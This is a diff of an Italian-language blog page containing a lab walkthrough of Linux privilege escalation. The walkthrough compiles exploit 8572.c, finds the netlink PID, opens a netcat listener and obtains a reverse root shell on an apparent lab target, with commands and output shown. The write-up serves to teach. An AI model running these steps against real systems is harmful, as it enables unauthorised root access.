+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>15:19:24 <span style="color:#f92672">(</span>100.46 MB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;8572.c&#39;</span> saved <span style="color:#f92672">[</span>2876/2876<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Ora che i file necessari per eseguire questo exploit sono stati trasferiti con successo al nostro obiettivo, siamo quasi pronti per l&rsquo;esecuzione. Poiché il file exploit è codificato in C, dobbiamo compilarlo in un eseguibile. Non entreremo nel dettaglio dei linguaggi compilati qui ma, fondamentalmente, c&rsquo;è del codice sorgente che deve essere compilato per essere eseguito. Possiamo farlo su sistemi Linux usando GCC (GNU Compiler Collection).</p>
 <p>Eseguiamo il comando seguente per compilare il file exploit 8572.c in un eseguibile, utilizzando il flag <strong>-o</strong> per specificare il nome del file di output:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc -o exploit 8572.c
-</code></pre></div><p>Se si lamenta di non trovare ld (il linker dinamico), possiamo usare il flag <strong>-B</strong> per specificare dove dovrebbe trovarsi ld, in questo caso, sotto /usr/bin, in questo modo:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc -B /usr/bin -o exploit 8572.c
-</code></pre></div><p>Finalmente possiamo usare ls per verificare che il nostro file eseguibile sia stato compilato correttamente:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc -o exploit 8572.c
-collect2: cannont find <span style="color:#e6db74">&#39;ld&#39;</span>
-
-gcc -B /usr/bin -o exploit 8572.c
-
-ls
-4674.jsvc_up
-8572.c
-exploit
-jVswA
-mhbkk
-run
-</code></pre></div><p>Nella documentazione del file 8572.c, si dice che dobbiamo trovare il PID (identificatore di processo) del socket Netlink, che di solito è il PID del processo UDEVD meno uno. Possiamo farlo eseguendo <strong>cat /proc/net/netlink</strong> e l&rsquo;unico PID diverso da zero dovrebbe essere il numero che vogliamo. Verifica che sia corretto eseguendo <strong>ps aux | grep udev</strong> — dovrebbe essere un numero più alto.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /proc/net/netlink
-sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
-de313800 <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
-dd15ca00 <span style="color:#ae81ff">4</span>   <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
-dd657000 <span style="color:#ae81ff">7</span>   <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
-de1afc00 <span style="color:#ae81ff">9</span>   <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
-ddc0dc00 <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
-de313c00 <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
-ddc7ac00 <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2352</span>   <span style="color:#ae81ff">00000001</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
-de38f800 <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
-dd75a000 <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
-</code></pre></div><p>Successivamente, dobbiamo impostare un listener sulla nostra macchina Kali in modo che quando viene eseguito lo script &ldquo;run&rdquo;, siamo in grado di catturare la shell. Su Kali, digita <strong>nc -lvp 4321</strong> per ascoltare le connessioni in entrata.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o exploit 8572.c
+</span></span></code></pre></div><p>Se si lamenta di non trovare ld (il linker dinamico), possiamo usare il flag <strong>-B</strong> per specificare dove dovrebbe trovarsi ld, in questo caso, sotto /usr/bin, in questo modo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -B /usr/bin -o exploit 8572.c
+</span></span></code></pre></div><p>Finalmente possiamo usare ls per verificare che il nostro file eseguibile sia stato compilato correttamente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o exploit 8572.c
+</span></span><span style="display:flex;"><span>collect2: cannont find <span style="color:#e6db74">&#39;ld&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gcc -B /usr/bin -o exploit 8572.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>4674.jsvc_up
+</span></span><span style="display:flex;"><span>8572.c
+</span></span><span style="display:flex;"><span>exploit
+</span></span><span style="display:flex;"><span>jVswA
+</span></span><span style="display:flex;"><span>mhbkk
+</span></span><span style="display:flex;"><span>run
+</span></span></code></pre></div><p>Nella documentazione del file 8572.c, si dice che dobbiamo trovare il PID (identificatore di processo) del socket Netlink, che di solito è il PID del processo UDEVD meno uno. Possiamo farlo eseguendo <strong>cat /proc/net/netlink</strong> e l&rsquo;unico PID diverso da zero dovrebbe essere il numero che vogliamo. Verifica che sia corretto eseguendo <strong>ps aux | grep udev</strong> — dovrebbe essere un numero più alto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /proc/net/netlink
+</span></span><span style="display:flex;"><span>sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+</span></span><span style="display:flex;"><span>de313800 <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>dd15ca00 <span style="color:#ae81ff">4</span>   <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>dd657000 <span style="color:#ae81ff">7</span>   <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>de1afc00 <span style="color:#ae81ff">9</span>   <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>ddc0dc00 <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>de313c00 <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>ddc7ac00 <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2352</span>   <span style="color:#ae81ff">00000001</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>de38f800 <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>dd75a000 <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">2</span>
+</span></span></code></pre></div><p>Successivamente, dobbiamo impostare un listener sulla nostra macchina Kali in modo che quando viene eseguito lo script &ldquo;run&rdquo;, siamo in grado di catturare la shell. Su Kali, digita <strong>nc -lvp 4321</strong> per ascoltare le connessioni in entrata.</p>
 <p>Ora che il nostro listener è aperto, possiamo finalmente sfruttare il bersaglio. Ricordiamoci di passare come argomento il PID di Netlink, in questo caso 2352, ma potrebbe essere sempre diverso. Eseguiamo il seguente comando nella shell di basso livello:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./exploit <span style="color:#ae81ff">2352</span>
-</code></pre></div><p>Dopo alcuni istanti, una connessione dovrebbe riaprirsi sul nostro listener Netcat e possiamo eseguire comandi come <strong>id</strong> e <strong>whoami</strong> per visualizzare le informazioni dell&rsquo;utente. Possiamo vedere che abbiamo ottenuto l&rsquo;accesso a livello di root e da qui possiamo praticamente fare tutto ciò che vogliamo sul sistema:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-└─$ nc -lvp <span style="color:#ae81ff">4321</span>
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4321</span> ...
-192.168.1.245: inverse host lookup failed: Unknown host
-connect to <span style="color:#f92672">[</span>192.168.1.176<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.245<span style="color:#f92672">]</span> <span style="color:#ae81ff">35612</span>
-id
-uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
-whoami
-root
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./exploit <span style="color:#ae81ff">2352</span>
+</span></span></code></pre></div><p>Dopo alcuni istanti, una connessione dovrebbe riaprirsi sul nostro listener Netcat e possiamo eseguire comandi come <strong>id</strong> e <strong>whoami</strong> per visualizzare le informazioni dell&rsquo;utente. Possiamo vedere che abbiamo ottenuto l&rsquo;accesso a livello di root e da qui possiamo praticamente fare tutto ciò che vogliamo sul sistema:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lvp <span style="color:#ae81ff">4321</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4321</span> ...
+</span></span><span style="display:flex;"><span>192.168.1.245: inverse host lookup failed: Unknown host
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>192.168.1.176<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.245<span style="color:#f92672">]</span> <span style="color:#ae81ff">35612</span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div>
       </div></div>
 
   
@@ -675,11 +686,6 @@ root
     <footer class="footer">
   <div class="footer__inner">
     
-      <div class="copyright">
-        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
-    
-      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
-      </div>
   </div>
 </footer>
 
@@ -688,7 +694,7 @@ root
 
 
 
-<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/bundle.min.js"></script>
+<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/SpaceHack/bundle.min.js"></script>
 
 
 
